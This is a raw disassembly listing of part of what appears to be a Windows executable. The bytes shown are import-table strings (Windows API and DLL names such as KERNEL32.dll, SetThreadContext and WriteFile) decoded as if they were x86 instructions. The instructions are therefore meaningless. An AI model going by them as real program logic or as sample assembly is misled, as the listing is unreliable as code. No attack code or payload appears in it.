  414234:	imul   ebp,DWORD PTR [esi+0x74],0x97005766
  41423b:	add    DWORD PTR [ecx+0x73],ecx
  41423e:	inc    esp
  41423f:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  414246:	jae    0x4142bb
  414248:	popa   
  414249:	addr16 gs inc ecx
  41424c:	add    BYTE PTR [eax],al
  41424e:	daa    
  41424f:	add    DWORD PTR [edi+0x65],eax
  414252:	je     0x41429f
  414254:	gs jns 0x4142b9
  414257:	outs   dx,DWORD PTR ds:[esi]
  414258:	popa   
  414259:	jb     0x4142bf
  41425b:	push   esp
  41425c:	jns    0x4142ce
  41425e:	gs add bh,al
  414261:	add    BYTE PTR [ebp+0x6e],al
  414264:	jne    0x4142d3
  414266:	inc    ebx
  414267:	push   0x57646c69
  41426c:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  414273:	add    BYTE PTR [ebp+0x53],dl
  414276:	inc    ebp
  414277:	push   edx
  414278:	xor    esi,DWORD PTR [edx]
  41427a:	cs fs ins BYTE PTR es:[edi],dx
  41427d:	ins    BYTE PTR es:[edi],dx
  41427e:	add    BYTE PTR [eax],al
  414280:	lods   al,BYTE PTR ds:[esi]
  414281:	add    BYTE PTR [ebx+0x72],al
  414284:	gs popa 
  414286:	je     0x4142ed
  414288:	push   edx
  414289:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41428e:	outs   dx,BYTE PTR ds:[esi]
  41428f:	dec    ecx
  414290:	outs   dx,BYTE PTR ds:[esi]
  414291:	imul   esi,DWORD PTR fs:[edx+0x65],0x89007463
  414299:	add    BYTE PTR [ebx+0x72],al
  41429c:	gs popa 
  41429e:	je     0x414305
  4142a0:	inc    edx
  4142a1:	jb     0x414318
  4142a3:	jae    0x41430d
  4142a5:	dec    ecx
  4142a6:	outs   dx,BYTE PTR ds:[esi]
  4142a7:	imul   esi,DWORD PTR fs:[edx+0x65],0xb7007463
  4142af:	add    DWORD PTR [eax+0x74],edx
  4142b2:	push   esi
  4142b3:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  4142ba:	iret   
  4142bb:	add    DWORD PTR [ebx+0x65],edx
  4142be:	ins    BYTE PTR es:[edi],dx
  4142bf:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  4142c4:	ins    BYTE PTR es:[edi],dx
  4142c5:	gs je  0x41433c
  4142c8:	add    BYTE PTR gs:[ebx+0x65724300],dl
  4142cf:	popa   
  4142d0:	je     0x414337
  4142d2:	inc    esp
  4142d3:	dec    ecx
  4142d4:	inc    edx
  4142d5:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xc4000070
  4142dd:	add    DWORD PTR [edx+0x65],edx
  4142e0:	jae    0x41434b
  4142e2:	jp     0x414349
  4142e4:	push   eax
  4142e5:	popa   
  4142e6:	ins    BYTE PTR es:[edi],dx
  4142e7:	gs je  0x41435e
  4142ea:	add    BYTE PTR gs:[ebp+0x766f4d01],bl
  4142f1:	gs push esp
  4142f3:	outs   dx,DWORD PTR ds:[esi]
  4142f4:	inc    ebp
  4142f5:	js     0x4142f7
  4142f7:	add    BYTE PTR [edx+0x65724300],bl
  4142fd:	popa   
  4142fe:	je     0x414365
  414300:	inc    esi
  414301:	outs   dx,DWORD PTR ds:[esi]
  414302:	outs   dx,BYTE PTR ds:[esi]
  414303:	je     0x41434e
  414305:	outs   dx,BYTE PTR ds:[esi]
  414306:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  41430e:	mov    esp,0x6c6c4500
  414313:	imul   esi,DWORD PTR [eax+0x73],0xb30065
  41431a:	inc    esp
  41431b:	gs ins BYTE PTR es:[edi],dx
  41431d:	gs je  0x414385
  414320:	inc    esp
  414321:	inc    ebx
  414322:	add    BYTE PTR [eax],al
  414324:	aad    0x0
  414326:	inc    ebp
  414327:	js     0x41439d
  414329:	push   esp
  41432a:	gs js  0x4143a1
  41432d:	dec    edi
  41432e:	jne    0x4143a4
  414330:	push   edi
  414331:	add    BYTE PTR [edi+0x65724300],al
  414337:	popa   
  414338:	je     0x41439f
  41433a:	inc    edx
  41433b:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xba000070
  414343:	add    DWORD PTR [edx+0x65],edx
  414346:	arpl   WORD PTR [esi+edx*2+0x69],si
  41434a:	jae    0x4143b5
  41434c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  414350:	int    0x0
  414352:	inc    ebp
  414353:	jae    0x4143b8
  414355:	popa   
  414356:	jo     0x4143bd
  414358:	add    BYTE PTR [eax],al
  41435a:	fadd   QWORD PTR [ecx]
  41435c:	push   ebx
  41435d:	gs je  0x4143a4
  414360:	dec    ecx
  414361:	inc    edx
  414362:	inc    ebx
  414363:	outs   dx,DWORD PTR ds:[esi]
  414364:	ins    BYTE PTR es:[edi],dx
  414365:	outs   dx,DWORD PTR ds:[esi]
  414366:	jb     0x4143bc
  414368:	popa   
  414369:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41436d:	add    BYTE PTR [ecx+0x66664f01],ah
  414373:	jae    0x4143da
  414375:	je     0x4143cd
  414377:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41437e:	dec    edi
  41437f:	jb     0x4143e8
  414381:	inc    ebp
  414382:	js     0x414384
  414384:	and    DWORD PTR [ecx],eax
  414386:	inc    edi
  414387:	gs je  0x4143cc
  41438a:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  414392:	jae    0x414394
  414394:	mov    dh,0x0
  414396:	inc    esp
  414397:	gs ins BYTE PTR es:[edi],dx
  414399:	gs je  0x414401
  41439c:	dec    edi
  41439d:	bound  ebp,QWORD PTR [edx+0x65]
  4143a0:	arpl   WORD PTR [eax+eax*1+0x0],si
  4143a4:	mov    al,ds:0x65724300
  4143a9:	popa   
  4143aa:	je     0x414411
  4143ac:	dec    eax
  4143ad:	popa   
  4143ae:	je     0x414413
  4143b0:	push   0x73757242
  4143b5:	push   0xaa0000
  4143ba:	inc    ebx
  4143bb:	jb     0x414422
  4143bd:	popa   
  4143be:	je     0x414425
  4143c0:	push   eax
  4143c1:	outs   dx,DWORD PTR ds:[esi]
  4143c2:	ins    BYTE PTR es:[edi],dx
  4143c3:	jns    0x41442c
  4143c5:	outs   dx,DWORD PTR ds:[esi]
  4143c6:	outs   dx,BYTE PTR ds:[esi]
  4143c7:	push   edx
  4143c8:	outs   dx,BYTE PTR ds:[si]
  4143ca:	add    BYTE PTR [eax],al
  4143cc:	add    DWORD PTR [eax],0x626d6f43
  4143d2:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  4143d9:	add    dl,dl
  4143db:	add    DWORD PTR [ebx+0x65],edx
  4143de:	je     0x414422
  4143e0:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  4143e8:	jae    0x4143ea
  4143ea:	lods   al,BYTE PTR ds:[esi]
  4143eb:	add    DWORD PTR [eax+0x6f],edx
  4143ee:	ins    BYTE PTR es:[edi],dx
  4143ef:	jns    0x414433
  4143f1:	gs jp  0x41445d
  4143f4:	gs jb  0x4143f7
  4143f7:	add    al,dl
  4143f9:	add    DWORD PTR [ebx+0x65],edx
  4143fc:	je     0x41443f
  4143fe:	bound  ebp,QWORD PTR [edi+0x72]
  414401:	je     0x414453
  414403:	jb     0x414474
  414405:	arpl   WORD PTR [eax],ax
  414407:	add    BYTE PTR [eax+0x66664f01],ah
  41440d:	jae    0x414474
  41440f:	je     0x414463
  414411:	outs   dx,BYTE PTR ds:[si]
  414413:	add    BYTE PTR [edx+eax*1],dl
  414416:	push   edi
  414417:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  41441f:	add    BYTE PTR [eax+0x65724300],dh
  414425:	popa   
  414426:	je     0x41448d
  414428:	push   ebx
  414429:	outs   dx,DWORD PTR ds:[esi]
  41442a:	ins    BYTE PTR es:[edi],dx
  41442b:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  414433:	add    BYTE PTR [edx+0x74654701],cl
  414439:	push   esp
  41443a:	gs js  0x4144b1
  41443d:	dec    ebp
  41443e:	gs je  0x4144b3
  414441:	imul   esp,DWORD PTR [ebx+0x73],0x16c0041
  414448:	inc    edi
  414449:	gs je  0x41449c
  41444c:	popa   
  41444d:	ins    BYTE PTR es:[edi],dx
  41444e:	gs je  0x4144c5
  414451:	gs inc ebp
  414453:	outs   dx,BYTE PTR ds:[esi]
  414454:	je     0x4144c8
  414456:	imul   esp,DWORD PTR [ebp+0x73],0x4300a200
  41445d:	jb     0x4144c4
  41445f:	popa   
  414460:	je     0x4144c7
  414462:	dec    ecx
  414463:	inc    ebx
  414464:	push   edi
  414465:	add    ah,cl
  414467:	add    DWORD PTR [ebx+0x65],edx
  41446a:	ins    BYTE PTR es:[edi],dx
  41446b:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  414470:	imul   esi,DWORD PTR [eax+0x52],0xd3006e67
  414477:	add    DWORD PTR [ebx+0x65],edx
  41447a:	je     0x4144be
  41447c:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  414484:	outs   dx,BYTE PTR gs:[esi]
  414486:	jae    0x4144f1
  414488:	outs   dx,DWORD PTR ds:[esi]
  414489:	outs   dx,BYTE PTR ds:[esi]
  41448a:	inc    ebp
  41448b:	js     0x41448d
  41448d:	add    bh,dl
  41448f:	add    DWORD PTR [ebx+0x65],edx
  414492:	je     0x4144d6
  414494:	jb     0x41450b
  414496:	jae    0x414500
  414498:	dec    edi
  414499:	jb     0x414502
  41449b:	inc    ebp
  41449c:	js     0x41449e
  41449e:	into   
  41449f:	add    DWORD PTR [ebx+0x65],edx
  4144a2:	ins    BYTE PTR es:[edi],dx
  4144a3:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  4144a8:	push   0x65
  4144aa:	arpl   WORD PTR [eax+eax*1+0x0],si
  4144ae:	add    DWORD PTR [ecx],0x47
  4144b1:	gs je  0x414508
  4144b4:	gs js  0x41452b
  4144b7:	inc    ebp
  4144b8:	js     0x41452e
  4144ba:	outs   dx,BYTE PTR gs:[esi]
  4144bc:	je     0x41450e
  4144be:	outs   dx,DWORD PTR ds:[esi]
  4144bf:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  4144c6:	xlat   BYTE PTR ds:[ebx]
  4144c7:	add    BYTE PTR [esi+0x69],al
  4144ca:	ins    BYTE PTR es:[edi],dx
  4144cb:	ins    BYTE PTR es:[edi],dx
  4144cc:	push   edx
  4144cd:	outs   dx,BYTE PTR ds:[si]
  4144cf:	add    BYTE PTR [esi+0x65724300],dl
  4144d5:	popa   
  4144d6:	je     0x41453d
  4144d8:	inc    ebp
  4144d9:	ins    BYTE PTR es:[edi],dx
  4144da:	ins    BYTE PTR es:[edi],dx
  4144db:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  4144e2:	outs   dx,BYTE PTR ds:[esi]
  4144e3:	dec    ecx
  4144e4:	outs   dx,BYTE PTR ds:[esi]
  4144e5:	imul   esi,DWORD PTR fs:[edx+0x65],0x6e007463
  4144ed:	add    DWORD PTR [edi+0x65],eax
  4144f0:	je     0x414542
  4144f2:	imul   edi,DWORD PTR [eax+0x65],0x7700006c
  4144f9:	add    DWORD PTR [edi+0x65],eax
  4144fc:	je     0x414551
  4144fe:	je     0x41456f
  414500:	arpl   WORD PTR [ebx+0x4f],bp
  414503:	bound  ebp,QWORD PTR [edx+0x65]
  414506:	arpl   WORD PTR [eax+eax*1+0x0],si
  41450a:	cmp    al,BYTE PTR [ecx]
  41450c:	inc    edi
  41450d:	gs je  0x414553
  414510:	jne    0x414584
  414512:	jb     0x414579
  414514:	outs   dx,BYTE PTR ds:[esi]
  414515:	je     0x414566
  414517:	bound  ebp,QWORD PTR [edx+0x65]
  41451a:	arpl   WORD PTR [eax+eax*1+0x0],si
  41451e:	jno    0x414521
  414520:	inc    edi
  414521:	gs je  0x414576
  414524:	dec    edi
  414525:	push   eax
  414526:	xor    al,BYTE PTR [eax]
  414528:	stos   DWORD PTR es:[edi],eax
  414529:	add    BYTE PTR [ebx+0x72],al
  41452c:	gs popa 
  41452e:	je     0x414595
  414530:	push   edx
  414531:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  414536:	outs   dx,BYTE PTR ds:[esi]
  414537:	add    BYTE PTR [edx+eax*1],al
  41453a:	push   ebx
  41453b:	je     0x41459e
  41453d:	jb     0x4145b3
  41453f:	inc    esp
  414540:	outs   dx,DWORD PTR ds:[esi]
  414541:	arpl   WORD PTR [edi+0x0],dx
  414544:	jbe    0x414546
  414546:	inc    edx
  414547:	imul   esi,DWORD PTR [edx+eax*2+0x6c],0x75000074
  41454f:	add    BYTE PTR [edx+0x65],al
  414552:	imul   ebp,DWORD PTR [bp+0x50],0x687461
  41455a:	mov    eax,0x61655201
  41455f:	ins    BYTE PTR es:[edi],dx
  414560:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  414567:	je     0x4145dd
  414569:	add    BYTE PTR gs:[eax],al
  41456c:	inc    edi
  41456d:	inc    esp
  41456e:	dec    ecx
  41456f:	xor    esi,DWORD PTR [edx]
  414571:	cs fs ins BYTE PTR es:[edi],dx
  414574:	ins    BYTE PTR es:[edi],dx
  414575:	add    BYTE PTR [eax+0x1],ah
  414578:	inc    esi
  414579:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  414580:	je     0x4145c8
  414582:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x3040000
  41458a:	dec    esp
  41458b:	gs popa 
  41458d:	jbe    0x4145f4
  41458f:	inc    ebx
  414590:	jb     0x4145fb
  414592:	je     0x4145fd
  414594:	arpl   WORD PTR [ecx+0x6c],sp
  414597:	push   ebx
  414598:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41459d:	outs   dx,BYTE PTR ds:[esi]
  41459e:	add    BYTE PTR [eax],al
  4145a0:	add    eax,DWORD PTR [ecx]
  4145a2:	inc    esp
  4145a3:	gs ins BYTE PTR es:[edi],dx
  4145a5:	gs je  0x41460d
  4145a8:	inc    esi
  4145a9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x4902b900
  4145b1:	outs   dx,BYTE PTR ds:[esi]
  4145b2:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  4145ba:	inc    ebx
  4145bb:	jb     0x414626
  4145bd:	je     0x414628
  4145bf:	arpl   WORD PTR [ecx+0x6c],sp
  4145c2:	push   ebx
  4145c3:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4145c8:	outs   dx,BYTE PTR ds:[esi]
  4145c9:	add    BYTE PTR [edx+0x6c614300],ah
  4145cf:	ins    BYTE PTR es:[edi],dx
  4145d0:	dec    esi
  4145d1:	popa   
  4145d2:	ins    DWORD PTR es:[edi],dx
  4145d3:	gs fs push eax
  4145d6:	imul   esi,DWORD PTR [eax+0x65],0x12000057
  4145dd:	add    al,0x53
  4145df:	gs je  0x414627
  4145e2:	jb     0x414656
  4145e4:	outs   dx,DWORD PTR ds:[esi]
  4145e5:	jb     0x414634
  4145e7:	outs   dx,DWORD PTR ds:[esi]
  4145e8:	fs add BYTE PTR gs:[eax],al
  4145ec:	pop    edi
  4145ed:	add    al,BYTE PTR [edi+0x65]
  4145f0:	je     0x414646
  4145f2:	gs ins DWORD PTR es:[edi],dx
  4145f4:	jo     0x41463c
  4145f6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  4145fe:	add    BYTE PTR [eax],al
  414600:	cmc    
  414601:	add    BYTE PTR [ebx+0x72],al
  414604:	gs popa 
  414606:	je     0x41466d
  414608:	push   edi
  414609:	popa   
  41460a:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  414612:	ins    DWORD PTR es:[edi],dx
  414613:	gs jb  0x41466d
  414616:	add    BYTE PTR [eax],al
  414618:	pop    ebp
  414619:	add    DWORD PTR [esi+0x69],eax
  41461c:	outs   dx,BYTE PTR ds:[esi]
  41461d:	fs inc esi
  41461f:	imul   esi,DWORD PTR [edx+0x73],0x6c694674
  414626:	gs inc ecx
  414628:	add    BYTE PTR [eax],al
  41462a:	test   al,0x2
  41462c:	dec    eax
  41462d:	gs popa 
  41462f:	jo     0x41467d
  414631:	outs   dx,DWORD PTR ds:[esi]
  414632:	arpl   WORD PTR [ebx+0x0],bp
  414635:	add    BYTE PTR [ebx+eax*1+0x6f6d6552],dh
  41463c:	jbe    0x4146a3
  41463e:	inc    esp
  41463f:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  414646:	jns    0x41469f
  414648:	add    BYTE PTR [eax],al
  41464a:	rol    BYTE PTR [eax],cl
  41464c:	inc    ebx
  41464d:	jb     0x4146b4
  41464f:	popa   
  414650:	je     0x4146b7
  414652:	inc    esi
  414653:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41465b:	outs   dx,BYTE PTR ds:[esi]
  41465c:	addr16 push edi
  41465e:	add    BYTE PTR [eax],al
  414660:	adc    al,0x3
  414662:	dec    esp
  414663:	outs   dx,DWORD PTR ds:[esi]
  414664:	arpl   WORD PTR [ecx+0x6c],sp
  414667:	push   ebx
  414668:	imul   edi,DWORD PTR [edx+0x65],0x47024200
  41466f:	gs je  0x4146c5
  414672:	push   0x5074726f
  414677:	popa   
  414678:	je     0x4146e2
  41467a:	dec    esi
  41467b:	popa   
  41467c:	ins    DWORD PTR es:[edi],dx
  41467d:	gs inc ecx
  41467f:	add    BYTE PTR ds:0x74654702,cl
  414685:	dec    ebp
  414686:	outs   dx,DWORD PTR ds:[esi]
  414687:	fs jne 0x4146f6
  41468a:	gs dec eax
  41468c:	popa   
  41468d:	outs   dx,BYTE PTR ds:[esi]
  41468e:	fs ins BYTE PTR es:[edi],dx
  414690:	gs push edi
  414692:	add    BYTE PTR [eax],al
  414694:	mov    ds:0x69725704,eax
  414699:	je     0x414700
  41469b:	inc    esi
  41469c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x6c470298
  4146a4:	outs   dx,DWORD PTR ds:[esi]
  4146a5:	bound  esp,QWORD PTR [ecx+0x6c]
  4146a8:	push   ebx
  4146a9:	imul   edi,DWORD PTR [edx+0x65],0xea0000
  4146b0:	inc    ebx
  4146b1:	jb     0x414718
  4146b3:	popa   
  4146b4:	je     0x41471b
  4146b6:	push   ebx
  4146b7:	gs ins DWORD PTR es:[edi],dx
  4146b9:	popa   
  4146ba:	jo     0x414724
  4146bc:	outs   dx,DWORD PTR ds:[esi]
  4146bd:	jb     0x414724
  4146bf:	push   edi
  4146c0:	add    BYTE PTR [eax],al
  4146c2:	jmp    0x4146c5
  4146c4:	inc    edi
  4146c5:	gs je  0x41470e
  4146c8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  4146d0:	bound  esi,QWORD PTR [ebp+0x74]
  4146d3:	gs jae 0x41471b
  4146d6:	js     0x41472f
  4146d8:	add    BYTE PTR [eax],al
  4146da:	mov    ebx,0x73655203
  4146df:	gs je  0x414727
  4146e2:	jbe    0x414749
  4146e4:	outs   dx,BYTE PTR ds:[esi]
  4146e5:	je     0x4146e7
  4146e7:	add    BYTE PTR [esi+0x4],cl
  4146ea:	push   ebx
  4146eb:	ins    BYTE PTR es:[edi],dx
  4146ec:	gs gs jo 0x414735
  4146f0:	js     0x4146f2
  4146f2:	int3   
  4146f3:	add    al,0x6c
  4146f5:	jae    0x41476b
  4146f7:	jb     0x41475c
  4146f9:	jo     0x414774
  4146fb:	outs   dx,BYTE PTR ds:[esi]
  4146fc:	push   edi
  4146fd:	add    dl,cl
  4146ff:	add    BYTE PTR [ebx+0x72],al
  414702:	gs popa 
  414704:	je     0x41476b
  414706:	inc    ebp
  414707:	jbe    0x41476e
  414709:	outs   dx,BYTE PTR ds:[esi]
  41470a:	je     0x41474d
  41470c:	add    BYTE PTR [eax],al
  41470e:	push   eax
  41470f:	add    al,BYTE PTR [edi+0x65]
  414712:	je     0x414767
  414714:	jns    0x414789
  414716:	je     0x41477d
  414718:	ins    DWORD PTR es:[edi],dx
  414719:	inc    esp
  41471a:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  414721:	jns    0x41477a
  414723:	add    BYTE PTR [edx+0x4],bh
  414726:	push   esi
  414727:	gs jb  0x41477d
  41472a:	gs je  0x414770
  41472d:	outs   dx,DWORD PTR ds:[esi]
  41472e:	outs   dx,BYTE PTR ds:[esi]
  41472f:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x73614d6e
  414738:	imul   eax,DWORD PTR [eax],0x7
  41473b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  41473f:	fs dec esp
  414741:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  414748:	js     0x4147a1
  41474a:	add    BYTE PTR [eax],al
  41474c:	pop    edi
  41474d:	add    al,0x54
  41474f:	ins    BYTE PTR es:[edi],dx
  414750:	jae    0x414799
  414752:	gs je  0x4147ab
  414755:	popa   
  414756:	ins    BYTE PTR es:[edi],dx
  414757:	jne    0x4147be
  414759:	add    bl,cl
  41475b:	add    cl,BYTE PTR [ecx+0x73]
  41475e:	inc    edx
  41475f:	popa   
  414760:	fs push edx
  414762:	gs popa 
  414764:	fs push eax
  414766:	je     0x4147da
  414768:	add    BYTE PTR [eax],al
  41476a:	inc    ebx
  41476b:	add    al,BYTE PTR [edi+0x65]
  41476e:	je     0x4147c3
  414770:	push   0x5074726f
  414775:	popa   
  414776:	je     0x4147e0
  414778:	dec    esi
  414779:	popa   
  41477a:	ins    DWORD PTR es:[edi],dx
  41477b:	gs push edi
  41477d:	add    BYTE PTR [edx+eax*1+0x47],dh
  414781:	gs je  0x4147d9
  414784:	jae    0x4147eb
  414786:	jb     0x4147cc
  414788:	gs popaw 
  41478b:	jne    0x4147f9
  41478d:	je     0x4147db
  41478f:	popa   
  414790:	outs   dx,BYTE PTR ds:[esi]
  414791:	addr16 dec ecx
  414793:	inc    esp
  414794:	add    BYTE PTR [eax],al
  414796:	adc    DWORD PTR [ebx],eax
  414798:	dec    esp
  414799:	outs   dx,DWORD PTR ds:[esi]
  41479a:	arpl   WORD PTR [ecx+0x6c],sp
  41479d:	dec    esp
  41479e:	outs   dx,DWORD PTR ds:[esi]
  41479f:	arpl   WORD PTR [ebx+0x0],bp
  4147a2:	mov    ecx,0x6e6f4300
  4147a7:	jbe    0x41480e
  4147a9:	jb     0x41481f
  4147ab:	inc    esp
  4147ac:	gs popaw 
  4147af:	jne    0x41481d
  4147b1:	je     0x4147ff
  4147b3:	outs   dx,DWORD PTR ds:[esi]
  4147b4:	arpl   WORD PTR [ecx+0x6c],sp
  4147b7:	add    BYTE PTR gs:[eax],al
  4147ba:	inc    BYTE PTR [ecx]
  4147bc:	inc    edi
  4147bd:	gs je  0x41480c
  4147c0:	outs   dx,DWORD PTR ds:[esi]
  4147c1:	arpl   WORD PTR [ecx+0x6c],sp
  4147c4:	gs dec ecx
  4147c6:	outs   dx,BYTE PTR ds:[esi]
  4147c7:	outs   dx,WORD PTR ds:[esi]
  4147c9:	inc    ecx
  4147ca:	add    BYTE PTR [eax],al
  4147cc:	loopne 0x4147ce
  4147ce:	inc    ebx
  4147cf:	jb     0x414836
  4147d1:	popa   
  4147d2:	je     0x414839
  4147d4:	dec    ebp
  4147d5:	jne    0x41484b
  4147d7:	gs js  0x414831
  4147da:	add    BYTE PTR [eax],al
  4147dc:	adc    eax,0x74655304
  4147e1:	inc    esi
  4147e2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x54736970
  4147ea:	outs   dx,DWORD PTR ds:[esi]
  4147eb:	dec    edi
  4147ec:	inc    ebp
  4147ed:	dec    ebp
  4147ee:	add    BYTE PTR [eax],al
  4147f0:	xor    DWORD PTR [ecx],eax
  4147f2:	inc    ebp
  4147f3:	jae    0x414858
  4147f5:	popa   
  4147f6:	jo     0x41485d
  4147f8:	inc    ebx
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	ins    DWORD PTR es:[edi],dx
  4147fb:	ins    DWORD PTR es:[edi],dx
  4147fc:	inc    esi
  4147fd:	jne    0x41486d
  4147ff:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  414803:	outs   dx,BYTE PTR ds:[esi]
  414804:	add    BYTE PTR [eax],al
  414806:	ss add al,0x53
  414809:	gs je  0x414860
  41480c:	push   0x64616572
  414811:	inc    ebx
  414812:	outs   dx,DWORD PTR ds:[esi]
  414813:	outs   dx,BYTE PTR ds:[esi]
  414814:	je     0x41487b
  414816:	js     0x41488c
  414818:	add    BYTE PTR [eax],al
  41481a:	sub    eax,DWORD PTR [ebx]
  41481c:	dec    ebp
  41481d:	outs   dx,DWORD PTR ds:[esi]
  41481e:	jbe    0x414885
  414820:	inc    esi
  414821:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x67004178
  414829:	add    al,BYTE PTR [edi+0x65]
  41482c:	je     0x414882
  41482e:	push   0x64616572
  414833:	dec    esp
  414834:	outs   dx,DWORD PTR ds:[esi]
  414835:	arpl   WORD PTR [ecx+0x6c],sp
  414838:	add    BYTE PTR gs:[ebp+0x4],ch
  41483c:	push   ebp
  41483d:	outs   dx,BYTE PTR ds:[esi]
  41483e:	ins    BYTE PTR es:[edi],dx
  41483f:	outs   dx,DWORD PTR ds:[esi]
  414840:	arpl   WORD PTR [ebx+0x46],bp
  414843:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x41007d00
  41484b:	fs fs inc ecx
  41484e:	je     0x4148bf
  414850:	ins    DWORD PTR es:[edi],dx
  414851:	push   edi
  414852:	add    BYTE PTR [eax],al
  414854:	push   ebp
  414855:	add    al,BYTE PTR [edi+0x65]
  414858:	je     0x4148ad
  41485a:	jns    0x4148cf
  41485c:	je     0x4148c3
  41485e:	ins    DWORD PTR es:[edi],dx
  41485f:	push   esp
  414860:	imul   ebp,DWORD PTR [ebp+0x65],0x756a6441
  414867:	jae    0x4148dd
  414869:	ins    DWORD PTR es:[edi],dx
  41486a:	outs   dx,BYTE PTR gs:[esi]
  41486c:	je     0x41486e
  41486e:	mov    WORD PTR [edi+edx*2],es
  414871:	popa   
  414872:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  41487a:	je     0x4148e5
  41487c:	jo     0x4148ea
  41487e:	gs dec edi
  414880:	bound  ebp,QWORD PTR [edx+0x65]
  414883:	arpl   WORD PTR [ebx+esi*2+0x0],si
  414887:	add    BYTE PTR [ecx+0x2],ah
  41488a:	inc    edi
  41488b:	gs je  0x4148e2
  41488e:	gs ins DWORD PTR es:[edi],dx
  414890:	jo     0x4148e2
  414892:	popa   
  414893:	je     0x4148fd
  414895:	inc    ecx
  414896:	add    BYTE PTR [eax],al
  414898:	out    dx,al
  414899:	add    DWORD PTR [edi+0x65],eax
  41489c:	je     0x4148e4
  41489e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x53],0x657a69
  4148a6:	mov    BYTE PTR [esp+ebp*2],0x73
  4148aa:	je     0x41491e
  4148ac:	arpl   WORD PTR [ebp+0x70],bp
  4148af:	imul   edx,DWORD PTR [edi+0x0],0x6c470290
  4148b6:	outs   dx,DWORD PTR ds:[esi]
  4148b7:	bound  esp,QWORD PTR [ecx+0x6c]
  4148ba:	inc    esi
  4148bb:	jb     0x414922
  4148bd:	add    BYTE PTR gs:[eax],al
  4148c0:	rol    DWORD PTR [eax],1
  4148c2:	inc    ebx
  4148c3:	jb     0x41492a
  4148c5:	popa   
  4148c6:	je     0x41492d
  4148c8:	inc    esi
  4148c9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  4148d1:	outs   dx,BYTE PTR ds:[esi]
  4148d2:	addr16 inc ecx
  4148d4:	add    BYTE PTR [eax],al
  4148d6:	cmp    al,BYTE PTR [ebx]
  4148d8:	dec    edi
  4148d9:	jo     0x414940
  4148db:	outs   dx,BYTE PTR ds:[esi]
  4148dc:	inc    esi
  4148dd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x52454b00
  4148e5:	dec    esi
  4148e6:	inc    ebp
  4148e7:	dec    esp
  4148e8:	xor    esi,DWORD PTR [edx]
  4148ea:	cs fs ins BYTE PTR es:[edi],dx
  4148ed:	ins    BYTE PTR es:[edi],dx
  4148ee:	add    BYTE PTR [eax],al
  4148f0:	push   ss
  4148f1:	add    BYTE PTR [eax+0x72],dl
  4148f4:	imul   ebp,DWORD PTR [esi+0x74],0x45676c44
  4148fb:	js     0x414954
  4148fd:	add    BYTE PTR [ebx],dl
  4148ff:	add    BYTE PTR [eax+0x61],dl
  414902:	addr16 gs push ebx
  414905:	gs je  0x41497d
  414908:	jo     0x41494e
  41490a:	ins    BYTE PTR es:[edi],dx
  41490b:	addr16 push edi
  41490d:	add    BYTE PTR [edx],al
  41490f:	add    BYTE PTR [ebx+0x68],al
  414912:	outs   dx,DWORD PTR ds:[esi]
  414913:	outs   dx,DWORD PTR ds:[esi]
  414914:	jae    0x41497b
  414916:	inc    ebx
  414917:	outs   dx,DWORD PTR ds:[esi]
  414918:	ins    BYTE PTR es:[edi],dx
  414919:	outs   dx,DWORD PTR ds:[esi]
  41491a:	jb     0x414973
  41491c:	add    BYTE PTR [eax],al
  41491e:	or     al,0x0
  414920:	inc    edi
  414921:	gs je  0x41496a
  414924:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656c7469
  41492c:	push   edi
  41492d:	add    BYTE PTR [edi],cl
  41492f:	add    BYTE PTR [edi+0x65],al
  414932:	je     0x414987
  414934:	popa   
  414935:	jbe    0x41499c
  414937:	inc    esi
  414938:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  414940:	add    BYTE PTR [eax],al
